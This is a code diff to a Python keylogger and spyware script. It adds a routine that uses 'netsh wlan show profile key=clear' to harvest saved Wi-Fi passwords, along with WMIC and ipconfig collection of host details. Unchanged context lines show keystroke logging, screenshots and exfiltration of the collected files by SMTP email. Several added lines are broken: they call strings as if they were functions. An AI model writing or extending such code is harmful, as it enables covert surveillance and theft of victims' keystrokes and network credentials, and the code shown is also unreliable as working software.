@@ -11,6 +11,8 @@ import pyscreenshot as screenCapture
 import socket
 import os.path
 import time
+import subprocess
+
 count = 0
 keys = []
 seconds = time.time()
@@ -21,10 +23,30 @@ subject = ' '
 save_path = "/Users/Default/Roaming/"
 system_information = os.path.join(save_path, "sysInfo.txt")
 screenshot = os.path.join(save_path, "screenshot.png")
+wifiInfo = os.path.join(save_path, "Wifi_Passswords.png")
+
+def get_wifiInfo():
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+    for i in profiles:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
+            '\n')
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        try:
+            f = open(wifiInfo, "a")
+            f.write("{:<10}: {:<}\n".format(i, results[0]))
+            f.close()
+        except IndexError:
+            f = open(wifiInfo, "a")
+            f.write("{:<10}: {:<}\n".format(i, ""))
+            f.close()
+
 
 def get_sysInfomation():
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
+    ModelInfo = subprocess.check_output(["WMIC", "CSPRODUCT"]).decode('utf-8')
+    WirelessInfo = subprocess.check_output(["ipconfig"]).decode('utf-8')
 
     f = open(system_information, "a")
     f.write("OS:" + platform.system())
@@ -33,6 +55,8 @@ def get_sysInfomation():
     f.write("Hostname: " + hostname + "\n")
     f.write("IP Address:: " + IPAddr + "\n")
     f.write("Processor Information:" + platform.processor() + "\n")
+    f.write("Manufacturer Information" + "\n" + ModelInfo())
+    f.write(WirelessInfo())
     f.close()
 
 def get_screenshot():
@@ -43,7 +67,8 @@ def sendEmail(filename, file):
     msg = MIMEMultipart()
     msg['From'] = email_user
     msg['To'] = email_send
-    msg['Subject'] = subject
+    date = subprocess.check_output(["date"]).decode('utf-8')
+    msg['Subject'] = subject + date
 
     body = "View attached files."
     msg.attach(MIMEText(body, 'plain'))
@@ -63,7 +88,6 @@ def sendEmail(filename, file):
     server.sendmail(email_user, email_send, text)
     server.quit
 
-
 def on_press(key):
     global keys, count
     keys.append(key)
@@ -74,6 +98,7 @@ def on_press(key):
         count = 0
         log_keys(keys)
         key = []
+
 def log_keys(keys):
     with open("log.txt", "a") as f:
         for key in keys:
